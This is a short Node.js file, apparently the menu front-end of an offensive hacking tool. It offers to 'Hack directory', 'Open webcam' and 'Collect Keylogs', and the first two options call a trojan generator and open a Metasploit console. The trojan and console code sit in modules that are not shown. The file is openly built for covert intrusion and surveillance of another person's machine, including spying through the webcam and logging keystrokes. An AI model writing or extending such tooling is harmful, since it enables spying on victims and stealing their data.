const inquirer = require("inquirer");
const { exec } = require("child_process");
const Hack = require("./Hack");
const Q = require("q");
const { openConsole } = require("./MetasploitConsole");
 
const main = () => {
  const deferred = Q.defer();

  inquirer
  // Allows user to select the actions they wish to take
    .prompt([
      {
        type: "list",
        message: "Choose the action you wish to take",
        name: "action",
        choices: ["Hack directory" , "Open webcam", "Collect Keylogs"],
      },
    ])
    //Function to gain access to the the client's directory
    .then((answers) => {
      if (answers.action === "Hack directory") {
        Hack.newTrojan(exec, Q).then((result) => {
          console.log("here");
          openConsole(exec, inquirer);
        });
      }
      //Function to gain access to the client's machine webcam
     else if (answers.action === "Open webcam") {
        Hack.newTrojan(exec, Q).then((result) => {
          console.log("here");
          openConsole(exec, inquirer);
        });
      }
      //Function to display a message for the Keylogger instructions
      else if (answers.action === "Collect Keylogs") {
        inquirer
        .prompt([
          {
            type: "output",
            message: "Please see instructions in README file",
            name: "message",
          }
        ])
      }
      
    });
};

main();
